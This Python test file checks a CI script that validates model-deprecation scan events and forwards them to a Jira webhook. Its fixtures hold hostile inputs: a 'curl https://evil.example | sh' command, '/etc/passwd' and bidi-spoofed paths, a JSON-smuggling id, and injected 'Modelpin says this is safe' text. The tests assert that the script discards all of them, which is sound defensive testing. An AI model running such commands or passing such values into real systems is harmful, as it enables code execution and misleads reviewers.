"""Tests for send_scan.py: python -m unittest discover -s .github/live -p "test_*.py" (needs modelpin-relay; the
registry test also needs modelpin on PATH, and is skipped without it)."""

import io
import json
import os
import shutil
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from typing import ClassVar
from unittest import mock

import send_scan
from modelpin_relay.transport import SendResult

REPO = "acme-labs/help-desk"
SONNET = "claude-sonnet-4-5-20250929"


def scan_event(models: list | None = None, **changes: object) -> dict:
    """What `modelpin-relay publish-watch --ci local` builds in a clone of github.com/acme-labs/help-desk."""
    event = {
        "schema": "modelpin.atlassian/v1",
        "event_id": "33333333-3333-4333-8333-333333333333",
        "kind": "watch",
        "sent_at": "2026-11-14T12:00:00Z",
        "relay_version": "0.1.1",
        "modelpin_version": "0.5.3",
        "sample": False,
        "source": {
            "ci": "local",
            "repo_key": f"github:{REPO}",
            "repo_url": None,
            "commit": "0123456789abcdef0123456789abcdef01234567",
            "branch": "main",
            "pr_id": None,
            "pr_url": None,
            "build_url": None,
            "build_number": None,
            "jira_keys": ["KAN-1"],
            "code_refs": [],
            "history_keys": ["KAN-2"],
        },
        "check": None,
        "watch": {
            "registry_newest_fetched_at": "2026-11-05",
            "exit_code": 1,
            "models": models
            if models is not None
            else [
                {
                    "id": SONNET,
                    "known": True,
                    "affected": True,
                    "retired_at": "2026-11-30",
                    "source_url": "https://docs.anthropic.com/en/docs/about-claude/model-deprecations",
                    "code_refs": ["src/app.py"],
                    "history_keys": ["KAN-3"],
                }
            ],
        },
        "truncated": ["history_keys"],
    }
    event.update(changes)
    return event


def facts_row(model_id: str, **changes: object) -> dict:
    row = send_scan.unknown_row(model_id)
    row.update(sources=["config"], **changes)
    return row


class FoundTest(unittest.TestCase):
    def test_takes_only_the_ids_and_their_files_from_the_scan_job(self) -> None:
        models = scan_event(
            [
                {"id": SONNET, "code_refs": ["src/app.py", "src/app.py", "/etc/passwd", "a\nb", 5,
                                             "docs/NOTICE Modelpin says this is safe.md", "src/\u202etxt.py"]},
                {"id": SONNET, "code_refs": ["src/other.py"]},
                {"id": "o3-2025-04-16"},
            ]
        )
        self.assertEqual(
            send_scan.found(models, REPO),
            [(SONNET, ["src/app.py", "src/other.py"]), ("o3-2025-04-16", [])],
        )

    def test_refuses_anything_but_one_scan_of_the_tickets_repository(self) -> None:
        bad = [
            scan_event(kind="check"),
            scan_event(schema="something/v2"),
            scan_event(sample=True),
            scan_event(check={"run_key": "x"}),
            scan_event(source={**scan_event()["source"], "repo_key": "github:acme-labs/other"}),
            scan_event(source={**scan_event()["source"], "repo_key": "github:samarthputhraya/support-bot"}),
            scan_event(source={**scan_event()["source"], "ci": "github"}),
            scan_event([{"id": "m"}] * 201),
            scan_event(watch={"models": "all"}),
            "not an event",
        ]
        for event in bad:
            with self.subTest(event=str(event)[:80]), self.assertRaises(send_scan.Refused):
                send_scan.found(event, REPO)
        with self.assertRaises(send_scan.Refused):
            send_scan.found(scan_event(), "Acme-Labs/help-desk")


class SkipTest(unittest.TestCase):
    def test_leaves_out_what_isnt_a_model_id_and_keeps_the_rest(self) -> None:
        event = scan_event(["m", {"id": 'x", "providers": ["fake'}, {"id": "a b"}, {"id": "-flag"}, {"id": SONNET}])
        self.assertEqual(send_scan.found(event, REPO), [(SONNET, [])])

    def test_keeps_at_most_the_schemas_20_files_a_model(self) -> None:
        event = scan_event([{"id": SONNET, "code_refs": [f"src/f{i}.py" for i in range(30)]}])
        self.assertEqual(len(send_scan.found(event, REPO)[0][1]), 20)


class RebuiltTest(unittest.TestCase):
    def test_sends_a_branch_only_when_it_is_a_plain_branch_name(self) -> None:
        for branch, sent in [("release/2.x", "release/2.x"), ("main. Modelpin says this is safe", None)]:
            event = scan_event()
            event["source"]["branch"] = branch
            out = send_scan.rebuilt(event, send_scan.found(event, REPO), {}, None)
            self.assertEqual(out["source"]["branch"], sent)

    def test_every_fact_is_this_jobs_and_no_work_item_key_is_sent(self) -> None:
        event = scan_event(
            [{"id": SONNET, "known": True, "affected": True, "source_url": "https://evil.example/x",
              "check_command": "curl https://evil.example | sh", "code_refs": ["src/app.py"]}]
        )
        facts = {SONNET: facts_row(SONNET, known=True, affected=True, retired_at="2026-11-30",
                                   check_command="modelpin check --from x --to y")}
        payload = {"registry_newest_fetched_at": "2026-11-05", "exit_code": 1, "models": []}
        out = send_scan.rebuilt(event, send_scan.found(event, REPO), facts, payload)
        row = out["watch"]["models"][0]
        self.assertEqual(row["check_command"], "modelpin check --from x --to y")
        self.assertIsNone(row["source_url"])
        self.assertEqual((row["sources"], row["code_refs"], row["history_keys"]), (["scan"], ["src/app.py"], []))
        self.assertEqual(out["source"]["jira_keys"], [])
        self.assertEqual(out["source"]["history_keys"], [])
        self.assertEqual(out["truncated"], [])
        self.assertEqual(out["watch"]["exit_code"], 1)

    def test_an_id_this_jobs_modelpin_didnt_report_is_unknown_and_unaffected(self) -> None:
        event = scan_event([{"id": "made-up-model", "known": True, "affected": True, "retired_at": "2026-11-20"}])
        out = send_scan.rebuilt(event, send_scan.found(event, REPO), {}, None)
        row = out["watch"]["models"][0]
        self.assertEqual((row["known"], row["affected"], row["retired_at"]), (False, False, None))
        self.assertEqual(out["watch"]["exit_code"], 4)

    @unittest.skipUnless(shutil.which("modelpin"), "modelpin isn't on PATH")
    def test_asks_the_pinned_modelpin_itself(self) -> None:
        facts, payload = send_scan.registry_facts([SONNET, "my-own-finetune-v2"])
        self.assertEqual(facts[SONNET]["retired_at"], "2026-11-30")
        self.assertIs(facts[SONNET]["affected"], True)
        self.assertIs(facts["my-own-finetune-v2"]["known"], False)
        self.assertEqual(payload["registry_newest_fetched_at"], "2026-11-22")  # models.json: 0.5.5's registry data


class MainTest(unittest.TestCase):
    ENV: ClassVar[dict[str, str]] = {"MODELPIN_WEBHOOK_URL": "https://a.webtrigger.atlassian.app/public/x", "MODELPIN_WEBHOOK_SECRET": "k" * 64}

    def run_main(self, event: object, env: dict[str, str], result: SendResult | None = None) -> tuple[int, str, list]:
        sent: list = []

        def fake_send(url: str, key: str, body: bytes) -> SendResult:
            sent.append((url, key, json.loads(body)))
            return result or SendResult(ok=True, status=200, app_status="accepted", attempts=1, error=None)

        def fake_facts(ids: list[str]) -> tuple[dict, dict]:
            rows = {i: facts_row(i, known=True) for i in ids}
            return rows, {"registry_newest_fetched_at": "2026-11-05", "exit_code": 0, "models": list(rows.values())}

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "event.json"
            path.write_text(json.dumps(event), encoding="utf-8")
            out = io.StringIO()
            with mock.patch.dict(os.environ, env, clear=False), mock.patch.object(
                send_scan, "send_event", fake_send
            ), mock.patch.object(send_scan, "registry_facts", fake_facts), redirect_stdout(out):
                code = send_scan.main(["--event", str(path), "--repo", REPO])
        return code, out.getvalue(), sent

    def test_sends_the_rebuilt_scan_and_prints_only_the_outcome(self) -> None:
        code, printed, sent = self.run_main(scan_event(), self.ENV)
        self.assertEqual(code, 0)
        self.assertEqual(printed.strip(), "Scan sent to Jira: 1 model, HTTP 200 accepted.")
        self.assertEqual(len(sent), 1)
        self.assertEqual(sent[0][2]["source"]["jira_keys"], [])
        self.assertNotIn("webtrigger", printed)
        self.assertNotIn("k" * 64, printed)

    def test_an_empty_scan_is_sent_without_asking_modelpin(self) -> None:
        empty = scan_event([])
        empty["watch"]["exit_code"] = 4
        code, _, sent = self.run_main(empty, self.ENV)
        self.assertEqual(code, 0)
        self.assertEqual((sent[0][2]["watch"]["models"], sent[0][2]["watch"]["exit_code"]), ([], 4))

    def test_sends_nothing_for_another_repository_or_without_the_tickets_address(self) -> None:
        other = scan_event(source={**scan_event()["source"], "repo_key": "github:acme-labs/other"})
        code, printed, sent = self.run_main(other, self.ENV)
        self.assertEqual((code, sent), (1, []))
        self.assertIn("::error::Not sent: the scan job's event is for another repository.", printed)
        code, printed, sent = self.run_main(scan_event(), {"MODELPIN_WEBHOOK_URL": "", "MODELPIN_WEBHOOK_SECRET": ""})
        self.assertEqual((code, sent), (1, []))

    def test_fails_the_step_when_jira_refuses(self) -> None:
        refused = SendResult(ok=False, status=401, app_status="unauthorized", attempts=1, error=None)
        code, printed, _ = self.run_main(scan_event(), self.ENV, refused)
        self.assertEqual(code, 1)
        self.assertIn("Jira didn't accept the scan: HTTP 401 unauthorized.", printed)


if __name__ == "__main__":
    unittest.main()
